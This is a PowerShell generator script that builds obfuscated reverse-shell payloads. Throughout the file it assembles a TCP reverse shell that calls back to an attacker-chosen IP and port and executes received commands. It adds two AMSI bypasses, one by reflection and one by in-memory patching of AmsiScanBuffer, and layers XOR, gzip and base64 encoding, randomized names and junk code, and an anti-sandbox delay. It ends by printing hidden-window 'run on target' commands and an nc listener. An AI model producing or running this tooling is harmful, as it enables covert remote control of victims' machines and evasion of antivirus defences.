<#
.SYNOPSIS
    Generator

.DESCRIPTION
    Plenty.

.PARAMETER IP
    IP address.

.PARAMETER Port
    port 

.PARAMETER BasicShellFile
    Basic source PS1

.PARAMETER insertfile
	Insert file at top

.PARAMETER BypassMode
    Bypass Both

.PARAMETER NoBypass
    future

.PARAMETER Confuse
    Randomness

.EXAMPLE    
    .\New-Makerz.ps1 -IP 192.168.255.29 -Port 4443
 
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [ValidatePattern('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')]
    [string]$IP,

    [Parameter(Mandatory=$true)]
    [ValidateRange(1,65535)]
    [int]$Port,

    [Parameter(Mandatory=$false)]
    [string]$BasicShellFile = 'c:\temp\basic_shell.ps1',

    [Parameter(Mandatory=$false)]
    [ValidateSet('IntFlags','Patch','Both')]
    [string]$BypassMode = 'IntFlags',

    [Parameter(Mandatory=$false)]
    [switch]$NoBypass,

    [Parameter(Mandatory=$false)]
    [switch]$Confuse,
	
	[Parameter(Mandatory=$false)]
	[string]$insertfile = 'C:\code\reverse-shell-generator-av-bypass-payloads/ChainedMathLogging.ps1',
	
	[Parameter(Mandatory=$false)]
	[string]$OutputFile
)


Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'


function Get-RandomName {
    param([int]$MinLen=5, [int]$MaxLen=11)
    $c = 'bcdfghjklmnpqrstvwxyz'
    $v = 'aeiou'
    $len = Get-Random -Minimum $MinLen -Maximum ($MaxLen + 1)
    $n = ''
    for ($i = 0; $i -lt $len; $i++) {
        if ($i % 2 -eq 0) { $n += $c[(Get-Random -Maximum $c.Length)] }
        else               { $n += $v[(Get-Random -Maximum $v.Length)] }
    }
    return [char]([int][char]'a' + (Get-Random -Maximum 26)) + $n
}

function Randomize-Case {
    param([string]$s)
    $o = ''
    foreach ($ch in $s.ToCharArray()) {
        if ((Get-Random -Maximum 2) -eq 0) { $o += $ch.ToString().ToUpper() }
        else                               { $o += $ch.ToString().ToLower() }
    }
    return $o
}

function To-CharArray {
    param([string]$s)
    $ords = ([int[]][char[]]$s) -join ','
    return "(-join([char[]]@($ords)))"
}

function Build-JunkLine {
    $v = Get-RandomName
    $n = Get-Random -Minimum 100 -Maximum 99999
    return "`$$v=$n"
}

function Build-JunkBlock {
    $v1 = Get-RandomName; $v2 = Get-RandomName; $v3 = Get-RandomName
    $n1 = Get-Random -Minimum 1000 -Maximum 99999
    $s1 = -join((65..90)+(97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 12) | %{[char]$_})
    return "`$$v1=$n1`n`$$v2='$s1'`nif(`$$v1 -gt $($n1+1)){`$$v3=`$$v2.Length}"
}

# CONFUSE

function Build-RandomComment {
    # Random comment line of random length with random printable content.
    param([int]$MinLen=60, [int]$MaxLen=400)
    $len  = Get-Random -Minimum $MinLen -Maximum $MaxLen
    $pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,;:!?-_()[]{}@#%^&*+=~'
    $text = -join((1..$len) | %{ $pool[(Get-Random -Maximum $pool.Length)] })
    return "# $text"
}

function Build-RandomCommentBlock {
    # Multiple random comment lines  
    param([int]$MinLines=2, [int]$MaxLines=6)
    $count = Get-Random -Minimum $MinLines -Maximum ($MaxLines + 1)
    $lines = @()
    for ($i = 0; $i -lt $count; $i++) {
        $lines += Build-RandomComment -MinLen (Get-Random -Minimum 40 -Maximum 150) `
                                      -MaxLen (Get-Random -Minimum 151 -Maximum 400)
    }
    return $lines -join "`n"
}

function Build-RandomMathLine {
    #   dead-code a 
    $v  = Get-RandomName
    $a  = Get-Random -Minimum 100    -Maximum 9999999
    $b  = Get-Random -Minimum 2      -Maximum 99999
    $c  = Get-Random -Minimum 1      -Maximum 9999
    $d  = Get-Random -Minimum 1      -Maximum 999
    $ops = @('+','-','*')
    $o1 = $ops[(Get-Random -Maximum 3)]
    $o2 = $ops[(Get-Random -Maximum 3)]
    $o3 = $ops[(Get-Random -Maximum 3)]
    return "`$$v=(($a $o1 $b) $o2 $c) $o3 $d"
}

function Build-RandomMathBlock {
    #   dead-code math  .
    param([int]$MinLines=4, [int]$MaxLines=12)
    $count = Get-Random -Minimum $MinLines -Maximum ($MaxLines + 1)
    $lines = @()
    for ($i = 0; $i -lt $count; $i++) { $lines += Build-RandomMathLine }
    return $lines -join "`n"
}

function Build-RandomLoop {
    #  nothing for-loop with random iteration count and internal math.
    $vIdx  = Get-RandomName
    $vAcc  = Get-RandomName
    $iters = Get-Random -Minimum 5000 -Maximum 999999
    $a     = Get-Random -Minimum 2  -Maximum 9999
    $b     = Get-Random -Minimum 1  -Maximum 999
    $ops   = @('+','-','*')
    $op    = $ops[(Get-Random -Maximum 3)]
    return "for(`$$vIdx=0;`$$vIdx -lt $iters;`$$vIdx++){`$$vAcc=$a $op $b}"
}

function Build-RandomLoopBlock {
    # Several do-nothing loops.
    param([int]$MinLoops=2, [int]$MaxLoops=5)
    $count = Get-Random -Minimum $MinLoops -Maximum ($MaxLoops + 1)
    $lines = @()
    for ($i = 0; $i -lt $count; $i++) { $lines += Build-RandomLoop }
    return $lines -join "`n"
}

function Build-ClockWait {
    #    Anti-sandbox clock-based busy-wait.     
    $vStart   = Get-RandomName
    $vNow     = Get-RandomName
    $vElapsed = Get-RandomName
    $vAcc     = Get-RandomName
    $vIdx     = Get-RandomName

    # Random math  
    $loopMath  = Build-RandomMathLine
    $loopMath2 = Build-RandomMathLine

    # Randomise 
    $kDT      = Randomize-Case 'DateTime'
    $kTS      = Randomize-Case 'TotalSeconds'

    return @"
`$$vStart=[$kDT]::Now
`$$vAcc=0
while(([$kDT]::Now-`$$vStart).$kTS -lt 7){
    $loopMath
    $loopMath2
    `$$vAcc++
}
"@
}

#   AMSI BYPAS 

function Build-AmsiBypass-IntFlags-L2 {
    $rT  = Get-RandomName; $rF = Get-RandomName; $rBF = Get-RandomName
    $kGT = Randomize-Case 'GetType'
    $kGF = Randomize-Case 'GetField'
    $kSV = Randomize-Case 'SetValue'
    $kBF = Randomize-Case 'BindingFlags'

    $typeExpr = To-CharArray 'System.Management.Automation.AmsiUtils'

    # BindingFlags 48 = NonPublic(32) + Static(16). Arithmetic split avoids -bor.
    $bfA = Get-Random -Minimum 1 -Maximum 47
    $bfExpr = "($bfA+$(48-$bfA))"

    if ((Get-Random -Maximum 2) -eq 0) {
        $fieldExpr = To-CharArray 'amsiInitFailed'
        $setLine   = "`$$rF.$kSV(`$null,`$true)"
    } else {
        $fieldExpr = To-CharArray 'amsiContext'
        $kIP       = Randomize-Case 'IntPtr'
        $setLine   = "`$$rF.$kSV(`$null,[$kIP]::Zero)"
    }

    return "`$$rT=[Ref].Assembly.$kGT($typeExpr);`$$rBF=[Reflection.$kBF]$bfExpr;`$$rF=`$$rT.$kGF($fieldExpr,`$$rBF);$setLine"
}

function Build-AmsiBypass-Patch-L2 {
    $typeDef = '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'

    $vNS  = Get-RandomName; $vCL  = Get-RandomName
    $vH   = Get-RandomName; $vF   = Get-RandomName; $vO   = Get-RandomName
    $vTDK = Get-RandomName; $vTDA = Get-RandomName; $vTD  = Get-RandomName

    $xk   = Get-Random -Minimum 1 -Maximum 255
    $tdB  = [int[]][char[]]$typeDef | %{ $_ -bxor $xk }
    $half = [math]::Floor($tdB.Count / 2)
    $tdExpr = "@($($tdB[0..($half-1)] -join ','),$($tdB[$half..($tdB.Count-1)] -join ','))"

    $dllE = To-CharArray 'amsi.dll'
    $fnE  = To-CharArray 'AmsiScanBuffer'
    $kAT  = Randomize-Case 'Add-Type'; $kMD = Randomize-Case 'MemberDefinition'
    $kNA  = Randomize-Case 'Name';     $kNS2 = Randomize-Case 'Namespace'
    $kLL  = Randomize-Case 'LoadLibrary'; $kGP = Randomize-Case 'GetProcAddress'
    $kVP  = Randomize-Case 'VirtualProtect'
    $kMSH = Randomize-Case 'System.Runtime.InteropServices.Marshal'
    $kCP  = Randomize-Case 'Copy'; $kON = Randomize-Case 'Out-Null'

    $lines = @(
        "`$$vTDK=$xk",
        "`$$vTDA=$tdExpr",
        "`$$vTD=-join(`$$vTDA|%{[char](`$_-bxor`$$vTDK)})",
        "$kAT -$kMD `$$vTD -$kNA '$vCL' -$kNS2 '$vNS'",
        "`$$vH=[$vNS.$vCL]::$kLL($dllE)",
        "`$$vF=[$vNS.$vCL]::$kGP(`$$vH,$fnE)",
        "`$$vO=0",
        "[$vNS.$vCL]::$kVP(`$$vF,[uint32]5,0x40,[ref]`$$vO)|$kON",
        "[$kMSH]::$kCP([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,`$$vF,6)"
    )
    return $lines -join "`n"
}

#   POLYMORPHIC 

$vClient    = Get-RandomName; $vStream    = Get-RandomName
$vBytes     = Get-RandomName; $vLen       = Get-RandomName
$vData      = Get-RandomName; $vSendBack  = Get-RandomName
$vSendBack2 = Get-RandomName; $vSendByte  = Get-RandomName

$ipExpr   = To-CharArray $IP
$jitter   = Get-Random -Minimum 100 -Maximum 9999
$portExpr = "($($Port + $jitter)-$jitter)"

$kSys  = Randomize-Case 'System';   $kNet  = Randomize-Case 'Net'
$kSock = Randomize-Case 'Sockets';  $kTCP  = Randomize-Case 'TCPClient'
$kGS   = Randomize-Case 'GetStream';$kASC  = Randomize-Case 'ASCII'
$kTxt  = Randomize-Case 'text';     $kEnc  = Randomize-Case 'encoding'
$kGStr = Randomize-Case 'GetString';$kOStr = Randomize-Case 'Out-String'
$kGB   = Randomize-Case 'GetBytes'; $kWr   = Randomize-Case 'Write'
$kFl   = Randomize-Case 'Flush';    $kCl   = Randomize-Case 'Close'
$kPth  = Randomize-Case 'Path';     $kTry  = Randomize-Case 'try'
$kCat  = Randomize-Case 'catch';    $kRd   = Randomize-Case 'Read'
$kIex  = if ((Get-Random -Maximum 2) -eq 0) { 'iex' } else { Randomize-Case 'Invoke-Expression' }

$shellL1 = @"
`$$vClient=[$kSys.$kNet.$kSock.$kTCP]::new($ipExpr,$portExpr);`$$vStream=`$$vClient.$kGS();[byte[]]`$$vBytes=0..65535|%{0};`$$vSendByte=([$kTxt.$kEnc]::$kASC).$kGB('PS '+($(Randomize-Case 'pwd')).$kPth+'> ');`$$vStream.$kWr(`$$vSendByte,0,`$$vSendByte.Length);`$$vStream.$kFl();while((`$$vLen=`$$vStream.$kRd(`$$vBytes,0,`$$vBytes.Length)) -ne 0){`$$vData=([$kTxt.$kEnc]::$kASC).$kGStr(`$$vBytes,0,`$$vLen);$kTry{`$$vSendBack=($kIex `$$vData 2>&1|$kOStr)}$kCat{`$$vSendBack=`$_.ToString()};`$$vSendBack2=`$$vSendBack+'PS '+($(Randomize-Case 'pwd')).$kPth+'> ';`$$vSendByte=([$kTxt.$kEnc]::$kASC).$kGB(`$$vSendBack2);`$$vStream.$kWr(`$$vSendByte,0,`$$vSendByte.Length);`$$vStream.$kFl()};`$$vClient.$kCl()
"@
$shellL1 = $shellL1.Trim()

#  
# XOR ENCODE LAYER 

$xorKey  = Get-Random -Minimum 1 -Maximum 254
$xorEnc  = [int[]][char[]]$shellL1 | %{ $_ -bxor $xorKey }

$vXKey  = Get-RandomName; $vXEnc = Get-RandomName; $vXDec = Get-RandomName
$kBxor  = Randomize-Case 'bxor'
$kChar  = Randomize-Case 'char'
$kIex2  = if ((Get-Random -Maximum 2) -eq 0) { 'iex' } else { Randomize-Case 'Invoke-Expression' }

$half    = [math]::Floor($xorEnc.Count / 2)
$encExpr = "@($($xorEnc[0..($half-1)] -join ','),$($xorEnc[$half..($xorEnc.Count-1)] -join ','))"
$xorStub = "`$$vXKey=$xorKey;`$$vXEnc=$encExpr;`$$vXDec=-join(`$$vXEnc|%{[$kChar](`$_-$kBxor`$$vXKey)});$kIex2 `$$vXDec"

#  GZip blob conten 

if ($NoBypass) {
    $layer2 = "try{$xorStub}catch{}"
} else {
    $bypassCode = switch ($BypassMode) {
        'IntFlags' { Build-AmsiBypass-IntFlags-L2 }
        'Patch'    { Build-AmsiBypass-Patch-L2 }
        'Both'     {
            $a = Build-AmsiBypass-IntFlags-L2
            $b = Build-AmsiBypass-Patch-L2
            "try{$a}catch{};try{$b}catch{}"
        }
    }
    if ($BypassMode -ne 'Both') { $bypassCode = "try{$bypassCode}catch{}" }
    $layer2 = "$bypassCode;try{$xorStub}catch{}"
}

#   GZIP + BASE64 

$msGen   = New-Object System.IO.MemoryStream
$gzGen   = New-Object System.IO.Compression.GzipStream(
               $msGen,
               [System.IO.Compression.CompressionMode]::Compress,
               $true)
[byte[]]$l2Bytes = [System.Text.Encoding]::UTF8.GetBytes($layer2)
$gzGen.Write($l2Bytes, 0, $l2Bytes.Length)
$gzGen.Close()
$gzB64 = [Convert]::ToBase64String($msGen.ToArray())

#   GZIP DECODER  

$vB   = Get-RandomName; $vMs  = Get-RandomName; $vGz  = Get-RandomName
$vSr  = Get-RandomName; $vDec = Get-RandomName

$kConv = Randomize-Case 'Convert'
$kNO   = Randomize-Case 'New-Object'
$kMSt  = Randomize-Case 'IO.MemoryStream'
$kGzS  = Randomize-Case 'IO.Compression.GzipStream'
$kMod  = Randomize-Case 'IO.Compression.CompressionMode'
$kSRdr = Randomize-Case 'IO.StreamReader'
$kSbc  = Randomize-Case 'ScriptBlock'
$kRTE  = Randomize-Case 'ReadToEnd'

# Split Base64 into 2-4 chunks
$b64chunks = @(); $b64pos = 0
$nChunks   = Get-Random -Minimum 2 -Maximum 5
$chunkLen  = [math]::Floor($gzB64.Length / $nChunks)
for ($ci = 0; $ci -lt $nChunks; $ci++) {
    if ($ci -eq ($nChunks - 1)) {
        $b64chunks += "'" + $gzB64.Substring($b64pos) + "'"
    } else {
        $b64chunks += "'" + $gzB64.Substring($b64pos, $chunkLen) + "'"
    }
    $b64pos += $chunkLen
}
$b64Expr = $b64chunks -join '+'

# Outer stub  
$outerLines = @(
    "`$$vB=[$kConv]::FromBase64String($b64Expr)",
    (Build-JunkLine),
    "`$$vMs=$kNO $kMSt(,`$$vB)",
    (Build-JunkLine),
    "`$$vGz=$kNO $kGzS(`$$vMs,[$kMod]::Decompress)",
    (Build-JunkLine),
    "`$$vSr=$kNO $kSRdr(`$$vGz)",
    "`$$vDec=`$$vSr.$kRTE()",
    "& ([$kSbc]::Create(`$$vDec))"
)
$outerStub = $outerLines -join "`n"

#  OUTPUT PS1 

$rName  = Get-RandomName
$rVer   = "$(Get-Random -Minimum 1 -Maximum 9).$(Get-Random -Minimum 0 -Maximum 99)"

#   sections
$sections = [System.Collections.Generic.List[string]]::new()

#   comments (random long block at top of file)
$sections.Add("# $rName v$rVer")
$sections.Add("`$ErrorActionPreference='SilentlyContinue'")
$sections.Add((Build-JunkBlock))

if ($Confuse) {
    
    $sections.Add((Build-RandomCommentBlock -MinLines 4 -MaxLines 9))
    
    $sections.Add((Build-ClockWait))
 
    $sections.Add((Build-RandomCommentBlock -MinLines 3 -MaxLines 6)) 
	
    $sections.Add((Build-RandomLoopBlock -MinLoops 3 -MaxLoops 6))
 
    $sections.Add((Build-RandomMathBlock -MinLines 7 -MaxLines 17))
 
    $sections.Add((Build-JunkBlock))
 
    $sections.Add((Build-RandomCommentBlock -MinLines 4 -MaxLines 8))
}

# GZip  
$sections.Add($outerStub)

# Trailing sections
$sections.Add((Build-JunkBlock))

if ($Confuse) {
    # Trailing  
    $sections.Add((Build-RandomCommentBlock -MinLines 2 -MaxLines 5))
    $sections.Add((Build-RandomMathBlock -MinLines 4 -MaxLines 8))
}

$outputScript = $sections -join "`n`n"
 
$outputScript | Out-File -FilePath $BasicShellFile -Encoding ascii -Force
 

$confuseLabel = if ($Confuse) { 'ON  (clock-wait + loops + math + comments)' } else { 'OFF (use -Confuse to enable)' }

Write-Host @"
=============================================================
=============================================================
"@ -ForegroundColor Cyan

Write-Host '[*] Layer 1 - polymorphic shell (plaintext, only used to build XOR):' -ForegroundColor Yellow
Write-Host $shellL1 -ForegroundColor DarkGray
Write-Host ''

Write-Host '[*] Layer 2 - GZip blob content (AMSI bypass + XOR stub):' -ForegroundColor Yellow
Write-Host $layer2 -ForegroundColor Gray
Write-Host ''

Write-Host '[*] Layer 3 - outer stub (visible in output PS1):' -ForegroundColor Yellow
Write-Host $outerStub -ForegroundColor DarkGray
Write-Host ''

if ($Confuse) {
    Write-Host '[*] Confuse mode: clock-wait + random loops + math + comments injected.' -ForegroundColor Magenta
    Write-Host '    Anti-sandbox: script waits 7 real clock seconds before payload runs.' -ForegroundColor Magenta
    Write-Host '    Sandboxes that fast-forward Sleep will wait real time here.' -ForegroundColor Magenta
    Write-Host ''
}


function New-RandomPs1Name {
    $random = [System.IO.Path]::GetRandomFileName().Replace(".", "")
    return Join-Path (Get-Location) "$random.ps1"
}

function Resolve-OutputPath {
    param([string]$OutputFile)

    if ([string]::IsNullOrWhiteSpace($OutputFile)) {
        $FilePathPlusRandomFileName = New-RandomPs1Name
        Write-Host "[+] Output PS1 written to Random Auto-generated: $FilePathPlusRandomFileName" -ForegroundColor Green
		Write-Host ''
		Write-Host '[*] Run on target:' -ForegroundColor Yellow
		Write-Host "    powershell -ep bypass -File `"$FilePathPlusRandomFileName`"" -ForegroundColor White
		Write-Host "    powershell -ep bypass -nop -noni -w hidden -File `"$FilePathPlusRandomFileName`"" -ForegroundColor White
		Write-Host ''
		Write-Host "[*] Listener: rlwrap nc -lvnp $Port" -ForegroundColor Yellow
		Write-Host ''
        return $FilePathPlusRandomFileName
    }
    return $OutputFile
}



function Merge-Scripts {
    param(
        [string]$BasicShellFile,
        [string]$InsertPath,
        [string]$OutputPath
    )

    $insertContent = Get-Content -Path $InsertPath -Raw
    $sourceContent = Get-Content -Path $BasicShellFile -Raw

    $merged = @"

$insertContent


$sourceContent

"@

    Set-Content -Path $OutputPath -Value $merged -Encoding UTF8
    return $merged
}

function Write-MergeSummary {
    param(
        [string]$InsertPath,
        [string]$BasicShellFile,
        [string]$OutputPath,
        [string]$MergedContent
    )

    $insertLines = (Get-Content -Path $InsertPath).Count
    $sourceLines = (Get-Content -Path $BasicShellFile).Count
    $mergedLines = ($MergedContent -split "`n").Count

    Write-Host " "
    Write-Host "Merge complete" -ForegroundColor Red
    Write-Host "  Insert file : $InsertPath  ($insertLines lines)"
    Write-Host "  Source file : $BasicShellFile  ($sourceLines lines)"
    Write-Host "  Output file : $OutputPath  ($mergedLines lines total)" -ForegroundColor Green
	Write-Host " "
}

function Invoke-ScriptMerge {
    param(
        [string]$BasicShellFile,
        [string]$InsertFile,
        [string]$OutputFile
    )

    $BasicShellFile = $BasicShellFile
    $insertPath = $InsertFile
    $outputPath = Resolve-OutputPath -OutputFile $OutputFile

    $merged = Merge-Scripts -BasicShellFile $BasicShellFile -InsertPath $insertPath -OutputPath $outputPath

    Write-MergeSummary -InsertPath $insertPath -BasicShellFile $BasicShellFile -OutputPath $outputPath -MergedContent $merged
}

# Merge PS1 Files 
Invoke-ScriptMerge -BasicShellFile $BasicShellFile -InsertFile $insertfile -OutputFile $outputfile

Write-Host ' '
Write-Host '[*] Run on target:' -ForegroundColor Yellow
Write-Host "    powershell -ep bypass -File `"$outputfile`"" -ForegroundColor White
Write-Host "    powershell -ep bypass -nop -noni -w hidden -File `"$outputfile`"" -ForegroundColor White
Write-Host ' '
Write-Host "[*] Listener: rlwrap nc -lvnp $Port" -ForegroundColor Yellow
Write-Host ' '

